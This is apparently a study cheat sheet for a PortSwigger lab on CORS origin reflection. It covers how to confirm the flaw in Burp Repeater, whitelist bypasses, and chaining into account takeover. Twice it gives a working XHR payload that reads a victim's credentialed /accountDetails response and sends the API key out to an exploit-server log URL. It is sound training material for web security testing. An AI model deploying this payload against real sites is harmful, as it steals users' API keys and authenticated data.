# CORS - Basic misconfiguration (origin reflection)

Server reflects any `Origin` header back in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. Any attacker-controlled page can make credentialed cross-origin XHR and read the response - stealing API keys, tokens, or any authenticated data.

## Quick reference
```http
# 1. Confirm: add Origin header in Burp Repeater
GET /accountDetails HTTP/1.1
Origin: https://attacker.com
< Access-Control-Allow-Origin: https://attacker.com
< Access-Control-Allow-Credentials: true

# 2. Exploit (deliver to victim via exploit server)
<script>
var req = new XMLHttpRequest();
req.onload = function() { location='https://EXPLOIT-SERVER/log?key=' + this.responseText; };
req.open('GET', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
</script>
```

## Root cause
Server mirrors `Origin` header value verbatim into `Access-Control-Allow-Origin`. Combined with `ACAC: true`, the browser permits the attacker's JS to read the full response body, including the victim's authenticated data.

## Find it
1. Log in as wiener, visit /my-account or profile.
2. In Burp history, find XHR to `/accountDetails` - check if response has `ACAC: true`.
3. In Repeater, add `Origin: https://example.com` -> if `ACAO: https://example.com` appears -> vulnerable.

## Technique
1. Confirm origin reflection in Burp Repeater (step above).
2. On exploit server, craft JS that sends XHR to the sensitive endpoint with `withCredentials: true`.
3. Exfil: on load, redirect to `exploit-server/log?key=<response>`.
4. "View exploit" first to confirm you see your own API key in the log.
5. "Deliver exploit to victim" -> access log -> victim's API key -> submit.

## Payload arsenal
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
  location='https://EXPLOIT-ID.exploit-server.net/log?key='+this.responseText;
}
</script>
```

## Bypasses
| Defense | Bypass |
|---|---|
| `ACAO: *` (not reflected) | `*` + `ACAC` is invalid combo - only reflected specific origins allow cred reads |
| Partial whitelist check | Try prefix/suffix tricks: `attacker.evil.com` if check is `endsWith(".evil.com")` |

## Exploitation walkthrough
1. Log in -> /my-account -> Burp history shows `GET /accountDetails` with `ACAC: true`.
2. Repeater: add `Origin: https://example.com` -> response: `ACAO: https://example.com`. Confirmed.
3. Exploit server body: XHR script above with correct LAB-ID and EXPLOIT-ID.
4. View exploit -> log shows `{"username":"wiener","apikey":"..."}`.
5. Deliver to victim -> access log -> victim's `apikey` value -> submit.

## Chaining
- API key -> account takeover (if API key used for auth)
- Combine with other endpoints: `/admin`, `/change-email`, `/change-password`

## Tools
- **Burp Repeater** - confirm Origin reflection
- **Exploit server** - host XHR page, review access log

## Labs

### CORS vulnerability with basic origin reflection [Apprentice]
/accountDetails AJAX has ACAC: true. Add `Origin: https://example.com` -> reflected in ACAO. XHR exploit steals victim's API key via log endpoint. Key insight: server reflects any origin without whitelist -> attacker can read any credentialed response.

## Real-world notes
- Origin reflection is extremely common - many frameworks do it by default for convenience.
- The attack requires `ACAC: true` - without it, cookies/auth headers are stripped.
- Always probe sensitive AJAX endpoints (`/api/user`, `/api/account`, `/profile`) for CORS headers.

## References
- https://portswigger.net/web-security/cors
